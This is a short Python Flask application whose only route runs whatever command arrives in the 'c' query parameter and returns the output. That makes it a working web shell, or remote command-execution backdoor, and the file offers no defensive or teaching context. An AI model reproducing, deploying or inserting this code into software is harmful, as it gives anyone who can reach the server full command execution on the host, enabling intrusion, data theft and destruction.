import flask
import subprocess

app = flask.Flask(__name__)

@app.route('/')
def index():
    return subprocess.check_output(flask.request.args.get('c', 'ls'))

app.run()
